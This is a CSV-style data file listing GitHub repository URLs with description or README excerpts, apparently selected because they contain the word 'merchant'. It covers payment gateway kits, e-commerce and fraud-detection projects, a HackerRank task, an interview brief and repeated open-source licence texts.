0,https://github.com/pouriamo66/-analytics-system-for-predicting-and-managing-fraud-in-financial-payment-services-.git," Build a Classification model by analyzing the transactional data (Cash-In, Cash-Out, Debit, Payment and Transfer) that consists of both normal customer behavior and fraudulent behavior to correctly categorize the transactions into fraudulent and non-fraudulent.    This goal will be achieved by investigating into following research questions with respect to the available dataset in order to build a model with the highest possible success rate:   ‚Ä¢ What types of transactions are actually fraudulent in nature? ‚Ä¢ What determines whether or not the feature ‚ÄòisFlaggedFraud‚Äô (illegal) gets implemented? ‚Ä¢ Are expected merchants accounts accordingly labelled? ‚Ä¢ Are there account labels common to fraudulent transactions?   ",,1
0,https://github.com/krunalsojitra/Paytm-Payments_Paytm_Web_Sample_Kit_PHP.git,"How to install the sample kit on a web server: Copy PaytmKit folder in document root of your server (like /var/www/html) Open config_paytm.php file from the PaytmKit/lib folder and update the below constant values PAYTM_MERCHANT_KEY ‚Äì Can be downloaded from the Paytm portal. One time downloadable PAYTM_MERCHANT_MID - MID (Merchant ID) can be collected from Paytm team PAYTM_MERCHANT_WEBSITE - Website name can be collected from Paytm team PaytmKit folder is having following files: TxnTest.php ‚Äì Testing transaction through Paytm gateway. pgRedirect.php ‚Äì This file has the logic of checksum generation and passing all required parameters to Paytm PG. pgResponse.php ‚Äì This file has the logic for processing PG response after the transaction processing. TxnStatus.php ‚Äì Testing Status Query API For Offline(Wallet Api) Checksum Utility below are the methods: getChecksumFromString : For generating the checksum verifychecksum_eFromStr : For verifing the checksum To generate refund checksum in PHP : Create an array with key value pair of following paytm parameters (MID, ORDERID, TXNTYPE, REFUNDAMOUNT, TXNID, REFID) To generate checksum, call the following method. This function returns the checksum as a string. getRefundChecksumFromArray($arrayList, $key, $sort=1)",,1
0,https://github.com/richievos/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/valer00n/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/JordanLeich/Zombie-Survival-Game.git,"This is a zombie survival game where you must make the best choices and decisions possible in order to live. As a survivor, you will encounter zombies, weapons, people, and a merchant to buy from with an in-game currency. Every decision you make has a cause and effect while some lead you to fortune and others lead you to death.","zombies,survival-game,survival,game,game-development,zombies-game,zombies-storyline,python,python3,games",1
0,https://github.com/woto/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/Strd79/Spending_Tracker_App.git,"This was my first individual CodeClan project to create a Spending Tracker App. I built this using Python, Flask, HTML/CSS, PostgreSQL and the psycopg. Users can track individual transactions, including the date, merchant and a tag (e.g. Food Shopping, Travel etc). They can then filter transactions by any of the above criteria and see a running total spent.",spending-tracker,1
0,https://github.com/apavlyut/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/nationalparkservice/SongMeterToNVSPL.git,R code to process audio files collected by Song Meters (Wildlife Acoustics) to convert audio to sound pressure levels in standard NPS format (NVSPL). Sound levels are calibrated using an end to end calibration from a modified version of PAMGuide (Merchant et al 2014),,1
0,https://github.com/grengojbo/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/dealsmanoj/GSTBillingApplication.git,"{""We are working on an open source GST billing Web Application in Asp.Net. All the developers are invited who is willing to join us in the development process of this web-application. This is a simple billing application where user can create GST Invoice online. The basic functionality has been added in the application like registering the company with company profile, Creating products categories and adding products, creating customers and finally creating invoices for its clients. So all of the merchants are well aware of the work flow of the application and can easily be adoped by its users. It is self developed so it is not complicated like tally or busy and can be customized and tailored as per the client requirements. The application will be developed in various faces. So if is a great chance for a beginner to learn all the concepts of a dynamic web-based project from front-end designing to complete coding in C# with Asp.Net.  The previous version of this billing package is a desktop version and already running to many clinets but they are also demanding that they require an online system or web-based system so that they can check/create invoice any time from anywhere from a centralized system. That's why we have started this project.  Some of the features of the application is: Online billing, centraized data storage and security, Accessible on mobile devices(billing on the way), SMS and Email Invoice We also invites experts to co-ordinates with us in the development and further enhancement of this project for market implementation as some of our clients already using the previous version of this application. ""}",,1
0,https://github.com/BlockchainLabs/NeosCoin.git,"{""Neos is different. How? In every way possible.  Neos isn't meant to be just a wallet, or another token to simply trade for Bitcoin. Neos is canvas on which every shade of every color can splash onto with ease. Our techniques may cause controversy, but we're ok with that.   SHA-256 Mining  Endless integration possibilities  Unique and innovative features  Spend Neos online or invest it  Completely dedicated team  New developments constantly |Live Pool Stats  Are you mining Neos? Enjoy the convenience of monitoring your performance on our pools without having to leave Neos! In-App Trading  The days of needing to navigate to your preferred exchanges to trade are now gone. Execute orders, deposit, and monitor performance directly from Neos. v2 is HERE!  Set to out-do v1 on every possible level, v2 boasts even more functionality, unseen features, and a smoother experience. NEOS SPECIFICATIONS Algorithm: SHA-256  Total coins: 21 Million (after the 21 million cap, a perpetual reward of 0.0625 remains per block to keep the chain moving)  Halving every: 210,000 blocks  Fair launch: Block 2 - 1001 the block reward was 0.1. Block 1002+ normal block reward  Block reward: 50 NEOS  Block time: 5 minutes  Tx fees: 0.00000001  Block confirmations: 120  Transaction confirmations: 6  Difficulty adjustment: per block (Dark Gravity Wave)  Launch date: 8/24/14 5PM EST  Coins offered in ICO: 1,050,000.00 | We are defying boundaries and redefining standards.  Real World Usability  Neos development is moving in a steady and reliable direction towards bridging the gap between merchants and consumers. Live Pool Stats  Are you mining Neos? Enjoy the convenience of monitoring your performance on our pools without having to leave Neos! In-App Trading  The days of needing to navigate to your preferred exchanges to trade are now gone. Execute orders, deposit, and monitor performance directly from Neos. v2 is HERE!  Set to out-do v1 on every possible level, v2 boasts even more functionality, unseen features, and a smoother experience. ""}",,1
0,https://github.com/zeddarn/cron-job.git,"A cron job that does the following. 1.\tQueries database order table and check for outstanding orders. An order is made when a customer makes a payment. An outstanding order is assumed to be an order with status as PENDING 2.\tUsing the PENDING order, Submit the order Transaction ID to a payment gateway and print the results. For the purpose of the test, use PESAPAL payment gateway. You will need to create Merchant Account on Pesapal so that you can get a Merchant Key and Secret Key. Below is the field order of the table. id >> int type, auto increment Primary Key status  >> > int type, Status of Payment (Default is pending) transaction_id  >> varchar, this is the key from payment gateway. The database order table is populated with ‚Äòfake‚Äô transaction ID.  Reference: https://www.pesapal.com/home/integration#reference . ",,1
0,https://github.com/naeemahaz/credit_card_marketing_model.git,"{""A credit card is a payment card issued to users (cardholders) to enable the cardholder to pay a merchant for goods and services based on the cardholder's promise to the card issuer to pay them for the amounts so paid plus the other agreed charges.The card issuer (usually a bank) creates a revolving account and grants a line of credit to the cardholder, from which the cardholder can borrow money for payment to a merchant or as a cash advance. In other words, credit cards combine payment services with extensions of credit. Complex fee structures in the credit card industry may limit customers' ability to comparison shop, help ensure that the industry is not price-competitive and help maximize industry profits. Because of this, legislatures have regulated credit card fees.""}",,1
0,https://github.com/phyverse/khalti.git,"# Woocommerce Plugin for Khalti  The basic steps to follow:  1. Go to the plugin section in your WordPress dashboard 2. Click on Add New and upload the zip file of Khalti WooCommerce plugin and upload it 3. After installation is complete, go to the WooCommerce section and to Settings 4. Go to Checkout option where you can find Khalti among other payment gateways 5. Click on Khalti option and enter your test secret key and test public key which you can get at Keys section in your merchant account 6. Click on save changes and complete a Khalti wallet transaction to pass the test 7. If you pass the test, Go to keys section in your merchant account, you can get your Live keys their 8. Enter your live key and click save changes",,1
0,https://github.com/AI-MEGHA/Predicting-Coupon-Redemption.git," XYZ Credit Card company regularly helps its merchants understand their data better and take key business decisions accurately by providing machine learning and analytics consulting. ABC is an established Brick & Mortar retailer that frequently conducts marketing campaigns for its diverse product range. As a merchant of XYZ, they have sought XYZ to assist them in their discount marketing process using the power of machine learning. Discount marketing and coupon usage are very widely used promotional techniques to attract new customers and to retain & reinforce loyalty of existing customers. The measurement of a consumer‚Äôs propensity towards coupon usage and the prediction of the redemption behaviour are crucial parameters in assessing the effectiveness of a marketing campaign. ABC promotions are shared across various channels including email, notifications, etc. A number of these campaigns include coupon discounts that are offered for a specific product/range of products. The retailer would like the ability to predict whether customers redeem the coupons received across channels, which will enable the retailer‚Äôs marketing team to accurately design coupon construct, and develop more precise and targeted marketing strategies.",,1
0,https://github.com/SahilGadge/NFC-Based-Secured-Payment-System.git,"The proposed system will be used for the payment transferring system. It uses NFC Feature. Use of near-field communication (NFC) technology through an Android Application to digitally transfer money from the payer‚Äôs bank account to the payee‚Äôs bank account with enhanced security and biometric authentication. Consumers who use the NFC Pay application can make secure mobile payments at nearly all merchant locations, via NFC. User pay payment by NFC Tag.",,1
0,https://github.com/nitinwagadia/Shopit.git,"Shop It! is a cloud based mobile application for enhancing the shopping experience for users on the go. Our application can recommend best offers in nearby stores, deals in restaurants and best discounts on products based on your location. Project uses highly scalable and efficient Amazon services like SQS and SNS for ensuring high availability. For notifications, we have used Google Cloud Messaging (GCM) for real time service. We are using REST API for providing responses from backend Elasticsearch engine scanning through high amount of geocoded deals data ensuring minimum response time for users. With this application users now have a power to reach beyond just an conventional shopping application. By registering as a merchant in the app and user can start own business or boost an existing one.",,1
0,https://github.com/jatotko/test.git,"/**  * Created with JetBrains WebStorm    * Date: 6/20/13  *  Copyright 2013 Brandon Xavier  This file is part of CB-AppDevKit.  CB-AppDevKit is free software: you can redistribute it and/or modify  it under the terms of the GNU General Public License as published by  the Free Software Foundation, either version 3 of the License, or  (at your option) any later version.  CB-AppDevKit is distributed in the hope that it will be useful,  but WITHOUT ANY WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the  GNU General Public License for more details.  You should have received a copy of the GNU General Public License  along with CB-AppDevKit.  If not, see <http://www.gnu.org/licenses/>.  */  var AppDevKit = true; var ADK = {\'readyToRun\': false,     \'scriptName\': """",     \'initFunction\': """",     \'settingsChoices\':",,1
0,https://github.com/Hengxiugao/CGDemo.git,"CGDemo is a companion of the textbook for L. Ammeraal and K. Zhang, Computer Graphics for Java Programmers,  2nd Edition, Wiley, 2006. Copyright (C) 2006  Janis Schubert, Kang Zhang, Leen Ammeraal . This program is free software; you can redistribute it and/or  modify it under the terms of the GNU General Public License as  published by the Free Software Foundation; either version 2 of  the License, or (at your option) any later version.   This program is distributed in the hope that it will be useful,  but WITHOUT ANY WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   See the GNU General Public License for more details.    You should have received a copy of the GNU General Public  License along with this program; if not, write to  the Free Software Foundation, Inc., 51 Franklin Street,  Fifth Floor, Boston, MA  02110-1301, USA. ",,1
0,https://github.com/Anirudhhat61/DigitalCash.git,"{""Basically this protocol implements an electronic cash system, in which the digital cash cannot be copied or reused more than once and the privacy of the customer's identity is  guaranteed.The system allows money transaction between three parties: Customer, Merchant and Bank. The electronic cash (ecash) used during these transactions is a file that contains:‚Ä¢the amountof the transaction involved; ‚Ä¢a uniqueness string number;‚Ä¢identity strings which contain the identity of the customer (this information remains secret unless the customer tries to use the ecash illicitly ‚Äìmore than once);‚Ä¢bank's signature (before the customer can use the ecash) The services provided for each party is described as follows:Customer‚Ä¢generates N orders for each money order the customer wants to make‚Ä¢and assigns a different random uniqueness string number for each of‚Ä¢the N ecash money orders‚Ä¢implements the secret splitting and bit commitment protocols used to‚Ä¢generate the identity strings that describe the customer's name, address and any other piece of identifying information that the bank wants to see.‚Ä¢implements a blind signature protocol for all N money orders‚Ä¢automatically complies to reveal the half of the identity string chosen by‚Ä¢the merchantMerchant‚Ä¢verification of the legitimacy of the bank's signature‚Ä¢random generator of the selector string, which determines the half ofthe identity string the customer is required to revealBank‚Ä¢random choice of 1 out of N money orders sent by the customer toremain unopened‚Ä¢an algorithm that certifies that all the N-1 money orders have been filledwith valid information‚Ä¢a procedure to certify that the orders received from merchants have notbeen used previously and storage of the uniqueness string and identitystrings of the orders in a database file‚Ä¢Appropriate measures against reuse of the ecash""}",,1
0,https://github.com/BitLLCoinDev/BitLLCoin.git,"BITLLCOIN(BTLLC) IS A CRYPTOCURRENCY BASED ON PEER TO PEER ONLINE PAYMENT NETWORK USING SCRYPT. We create BitLLCoin(BTLLC) to develop technical features bringing additional benefits to both consumers and service providers. We will build a wallet, based on Blockchain technology, that can store a variety of digital currencies and the BitLLCoin(BTLLC) Exchange can trade all of them.Also we will build web platform for merchant so they can accept payments with all kind of cryptocurrency. BitLLCoin(BTLLC) Debit Card where you can store your cryptocurrency and make a payment all over the world.",,1
0,https://github.com/augyg/Amazon-Web-Scrape.git,"My parents were spending 3 hours a day pulling and analyzing data from amazon in order to build their purchase order report. SO I said, hey fam have you heard of webscraping? By pulling the data from Amazon through webscraping, (since there is no API for merchant accounts) my parents now click a button that generates a simplified report stating the marginal profit of each unit for each SKU. All they have to do now is send the numbers by email to suppliers which takes 10 minutes. ",,1
0,https://github.com/ljinstat/Predicting_Repeated_Buyers_Double11.git,"Merchants sometimes run big promotions (e.g., discounts or cash coupons) on particular dates (e.g., Boxing-day Sales, ""Black Friday"" or ""Double 11 (Nov 11th)‚Äù, in order to attract a large number of new buyers. Unfortunately, many of the attracted buyers are one-time deal hunters, and these promotions may have little long lasting impact on sales. What\'s more, Tmall.com as the creator of Chinese shopping carnival ""Double 11 (Nov 11th)‚Äù is threatening by other e-commercial companies like Jingdong, Suning, which resluts in an increasingly high customer churn rate. As more and more customers involving in this shopping festival and more and more competitions appearing in the market, Tmall.com has to reinforce user loyalty to avoid customer loss. It is well known that in the field of online advertising, customer targeting is extremely challenging, especially for fresh buyers. However, with the long-term user behavior log accumulated by Tmall.com, we may be able to solve this problem using Machine learning models.",,1
0,https://github.com/Hulkofsales/money.git,"MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/AlgoEngAfzal/Hacker-rank-Matching-Book-Names-and-Descriptions-solution.git,"Our bot has crawled several product pages from the popular Indian e-commerce website, Flipkart.com. All of these pages are specifically about the most popular books being sold on Flipkart (at the time of the crawl).  Each page contained information for exactly one book. We noted down exactly two fields from each of these pages:  1. The name of the book. 2. Description fragment: The first few sentences of the description of the book, as displayed on the page. In some cases,  this string or text field might be terminated prematurely (i.e., not exactly at a word or a sentence boundary). Each of these text blocks is split into two parts of roughly equal length.  Set A contains the names of all the books. Set B contains the description fragments for all the books.  Both the Sets A and B are shuffled up, and the ordering of elements is lost.  Your task is to identify, for each name (a) in Set A, which is the correct corresponding text fragment (b) in Set B, such that, b was the descriptive fragment for the book named a.  Hints: Getting started - Think about using TF-IDF Scores (or a modification of it)  For those getting started with this fascinating domain of text classification, here\'s a wonderful Youtube video of Professor Christopher Manning from Stanford, explaining the TF-IDF , which you could consider using as a starting point.   Input Format  An Integer N on the first line. This is followed by 2N+1 lines.  Text fragments (numbered 1 to N) from Set A, each on a new line (so a total of N lines).  A separator with five asterisk marks ""*"" which indicates the end of Set A and the start of Set B.  Text fragments (numbered 1 to N) from Set B, each on a new line (so a total of N lines).  Output Format  N lines, each containing one integer.  The i-th line should contain an integer j such that the j-th element of Set A and the i-th element of Set B are a pair, i.e., both originally came from the same listing page on Flipkart.  Constraints  1 <= N <= 1000  No text fragment will have more than 10000 characters.  Sample Input  5 How to Be a Domestic Goddess : Baking and the Art of Comfort Cooking (Paperback) Embedded / Real-Time Systems 1st Edition (Paperback) The Merchant of Venice (Paperback) Lose a Kilo a Week (Paperback) Few Things Left Unsaid (Paperback) ***** Today the embedded systems are ubiquitous in occurrence, most significant in function and project an absolutely promising picture of developments in the near future. The Merchant Of Venice is one of Shakespeare\'s best known plays. How To Be A Domestic Goddess: Baking and the Art of Comfort Cooking is a bestselling cookbook by the famous chef Nigella Lawson who aims to introduce the art of baking through text with an emphasis. Lose A Kilo A Week is a detailed diet and weight loss plan, and also shows how to maintain the ideal weight after reaching it. Few Things Left Unsaid is a story of love, romance, and heartbreak. Sample Output  2 3 1 4 5 Explanation  Explaining the Input  The first line indicates that the test case contains the names and descriptions of five popular books listed on Flipkart.  The next five lines are the names of the books (i.e, Set A). After that, we have a separator. That is followed by five lines, each containing description fragments from Set B.  Explaining how we arrived at the Output  The first description, is visibly most closely related to the second book (Embedded / Real-Time Systems 1st Edition (Paperback)).  The second description, is clearly about the Merchant of Venice - which is the third book name in Set-A.  The third description is about Baking - and so, it corresponds to the first of the book names, in Set-A. Similarly, the fourth and fifth descriptions match best with the fourth and fifth book names (i.e, it so happens that they are already in order).  So, the expected output is 2, 3, 1, 4, 5 respectively.  Scoring  The weight for a test case will be proportional to the number of tests (book names) it contains. Two sample tests are available and visible on Compile & Test. A training driven approach or solution is not expected in this challenge, which is why no comprehensive training data has been provided.  Score = M * (C)/N Where M is the Maximum Score for the test case.  C = Number of correct answers in your output.  N = Total number of book names in the test set (which were divided into Set A and Set B respectively).  Note: Submissions will be disqualified if it is evident that the code has been written in such a way that the sample test case answers are hard-coded, or similar approaches, where the answer is not computed, but arrived at by trying to ensure the code matches the sample answers.  Timelimits  Timelimits can be seen here.  Libraries  Libraries available in our Machine Learning/Real Data challenges will be enabled for this contest and are listed here. Please note, that occasionally, a few functions or modules might not work in the constraints of our infrastructure. For instance, some modules try to run multiple threads (and fail). So please try importing the library and functions and cross checking if they work in our online editor in case you plan to develop a solution locally, and then upload to our site.",,1
0,https://github.com/cythecy1/cardgenytest.git,"Summary Create management portal and Web API (referred as GLvNext API below) to serve retail offers for mobile and SPA clients.  Details Offers should be  created locally via admin portal by merchants and  additionally, sourced from various remote APIs all available for consumption via the new GLvNext API for mobile / SPA clients. Offer (served via API) must have fields Title Description Please introduce more fields you consider required for Offer to be useable.  Offer example:  Title: ‚ÄúGet 20% discount for purchases over $100 from selected merchants this Valentine day‚Äù Description: ‚ÄúLorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat‚Äù Considerations: Admin portal authentication/authorisation can be mocked and not required to be fully implemented at this stage or focused at; Initial focus should be on backend and Web API implementation rather than front-end and UI/UX; No user login required to use GLvNext API; Please show usage of HttpClient in the solution; The system should be able to handle high load especially on API side but also handle possible large datasets coming from external sources, consider that this might be a part of large system and integrating with multiple data providers;  Choice of frontend stack is not important (we usually do standard ASP.net Core MVC, jquery or vue.js rather than SPA type of web apps)  Backend stack preferably .NET Core, any version 2.1 to 3.1;  Use Azure stack if familiar; Data persistence / ORM, the choice is yours, preference would be MS SQL and EF Core; Remote API to Consume Remote Offers API details: https://2d976b39.azurewebsites.net/v1/offers https://2d976b39.azurewebsites.net/swagger/index.html Required headers Gl-ApiKey: 8B5A92FC-CA0F-4920-9358-50D2EE74A716 Gl-AppKey: FB Feel free to ask questions about this API during the test. To-Do  Provide the following Approximate estimate in hours/days; High level breakdown of tasks to do; Next, you are required to set up the solution and start implementation. You are not expected to complete this within given 2 hours, so this is not a speed/stress test, simply work in your normal pace, the way you would usually do on a project. Please, submit your work either by zipping the solution up and sharing (dropbox etc.) or via GitHub, GitLab, Azure devops etc. Any clarification and questions are most welcome either via skype or email. Skype: pavel.orlov000 Email: pavel@globalloyalty.com  Bonus Task A bit of refactoring, please spend 15 min to review and submit PR with a few initial changes you recommend here if any. If you think it needs to be refactored further, put your ideas in the description of the PR. https://github.com/jack0fshad0ws/Interview-Quiz/blob/master/GL.FileParser/Class1.cs",,1
0,https://github.com/sboraiah/SmartCart.git,"Designed a course project that works as an e-commerce website. The domain under which the above database management system comes under is Commerce. The objective of the above system is to provide a content management website application, which allows members of the public to purchase specific products via transactions on the website without using any paper work . This system also tries to solve the current problems faced by the e-commerce industry today by using the following workarounds : 1. Segmentation : Dividing customers into first-time users, active customers and in-actives and targeting the first-time users by giving them extra services/features so that they turn into active customers. 2. Targeted Value : Merchant who wants to sell on the website can set up a targeted offer aimed at a specific set of customers.  Tools Used: SublimeText, MYSQL Workbench, LAMP server, Chrome.  Technologies Used: HTML, CSS, PHP, Java Script, MYSQL.",,1
0,https://github.com/CMGF2/TFOA888.git,"Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/FOI-Bioinformatics/cansnper1.1.git,"CanSNPer1.1: A toolkit for SNP-typing using NGS data. Copyright (C) 2016 Adrian L√§rkeryd Updates done by David Sundell  VERSION 1.1.0 (Adjusted to python 3, python 2 support is depricated)  This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.  You should have received a copy of the GNU General Public License along with this program.  If not, see <http://www.gnu.org/licenses/>.",,1
0,https://github.com/hardbaited/esx_joblisting.git,"{""# esx_joblisting  Simple job listing script, that i heavily modified cause i got bored of the old one :)  ## Download & Installation  ### Manually - Download https://github.com/hardbaited/esx_joblisting - Put it in the `[esx]` directory  ## Installation - Import `esx_joblisting.sql` in your database - Add this in your `server.cfg`:  ``` start esx_joblisting ```  # Legal ### License esx_joblisting - job listing script  Copyright (C) 2015-2020 J√©r√©mie N'gadi  This program Is free software: you can redistribute it And/Or modify it under the terms Of the GNU General Public License As published by the Free Software Foundation, either version 3 Of the License, Or (at your option) any later version.  This program Is distributed In the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty Of MERCHANTABILITY Or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License For more details.  You should have received a copy Of the GNU General Public License along with this program. If Not, see http://www.gnu.org/licenses/.""}",,1
0,https://github.com/Satwikan/DoodleJump.git,"Doodle Jump clone in JavaScript, HTML and CSS   Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  *Translation: Ofcourse you can use this for you project! Just make sure to say where you got this from :)  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/syedbrinto/readme-edits.git,"MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/daGeeZy1/MIT-License-Copyright-c-year-fullname-Permission-is-hereby-granted-free-of-charge-to-any-p.git,"MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/vonj/scraping.git,"Real life example of news site scraper. Download articles matching key\n    words, generate full content reports in PDF, Excel and SPSS.\n\n    SPSS generation might only work on Mac or Windows, pushed here to\n    github ‚Äúas is‚Äù. This whole program is just a hack, take it for what it\n    is, something hastily thrown together to. Enough of excuses - I present\n    you the license:\n\n    The MIT License (MIT)\n\n    Copyright (c) 2015 vonj\n\n    Permission is hereby granted, free of charge, to any person obtaining a\n    copy\n    of this software and associated documentation files (the ""Software""),\n    to deal\n    in the Software without restriction, including without limitation the\n    rights\n    to use, copy, modify, merge, publish, distribute, sublicense, and/or\n    sell\n    copies of the Software, and to permit persons to whom the Software is\n    furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be included\n    in\n    all copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS\n    OR\n    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n    THE\n    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n    FROM,\n    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS\n    IN\n    THE SOFTWARE.","python,scraping,news-site-scraper,spss-generation,spss,hack,pdf-report,statistics",1
